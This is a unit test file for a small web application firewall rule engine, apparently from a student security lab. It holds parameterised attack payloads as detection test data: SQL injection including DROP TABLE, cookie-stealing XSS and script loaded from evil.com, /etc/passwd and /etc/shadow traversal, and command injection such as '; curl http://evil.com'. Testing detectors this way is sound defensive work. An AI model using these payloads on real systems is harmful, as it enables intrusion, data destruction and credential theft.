"""
Unit tests for Mini WAF Rule Engine (rules.json).
Verifies detection of SQLi, XSS, Path Traversal, and Command Injection,
and verifies absence of false positives on legitimate inputs.
"""
import pytest
from waf.waf_proxy import inspect_value, COMPILED_RULES

def test_rules_loaded():
    assert len(COMPILED_RULES) >= 10

# ----------------- SQL Injection Tests -----------------
@pytest.mark.parametrize("payload", [
    "' OR '1'='1",
    "' or 'a'='a",
    "admin' --",
    "' OR 1=1 --",
    "1' UNION SELECT 1,2,3,4--",
    "UNION ALL SELECT null, null, username FROM users",
    "; DROP TABLE users;",
    "; DELETE FROM accounts WHERE 1=1",
    "1' AND SLEEP(5)--",
    "benchmark(10000000,MD5(1))"
])
def test_sqli_detection(payload):
    hit = inspect_value(payload, "test_param")
    assert hit is not None, f"Failed to detect SQLi payload: {payload}"
    assert hit['rule']['category'] == 'SQLi'

# ----------------- XSS Tests -----------------
@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "<script src='http://evil.com/xss.js'></script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
])
def test_xss_detection(payload):
    hit = inspect_value(payload, "test_param")
    assert hit is not None, f"Failed to detect XSS payload: {payload}"
    assert hit['rule']['category'] == 'XSS'

# ----------------- Path Traversal Tests -----------------
@pytest.mark.parametrize("payload", [
    "../../../../etc/passwd",
    "..\\..\\windows\\system32\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    "/etc/shadow",
    "win.ini"
])
def test_path_traversal_detection(payload):
    hit = inspect_value(payload, "test_param")
    assert hit is not None, f"Failed to detect Path Traversal payload: {payload}"
    assert hit['rule']['category'] == 'PathTraversal'

# ----------------- Command Injection Tests -----------------
@pytest.mark.parametrize("payload", [
    "; id",
    "; cat server.log",
    "| whoami",
    "&& ls -la",
    "; curl http://evil.com",
    "`id`",
    "$(whoami)"
])
def test_command_injection_detection(payload):
    hit = inspect_value(payload, "test_param")
    assert hit is not None, f"Failed to detect Command Injection payload: {payload}"
    assert hit['rule']['category'] == 'CommandInjection'

# ----------------- Legitimate Traffic (No False Positives) -----------------
@pytest.mark.parametrize("safe_input", [
    "Apple Juice 100% Organic",
    "Hello World! Welcome to the student security lab.",
    "user.email@university.edu",
    "Order #12345 completed on 2026-10-31.",
    "Search terms: python flask cybersecurity assessment"
])
def test_safe_inputs_not_blocked(safe_input):
    hit = inspect_value(safe_input, "safe_query")
    assert hit is None, f"False positive triggered on safe input: {safe_input}"
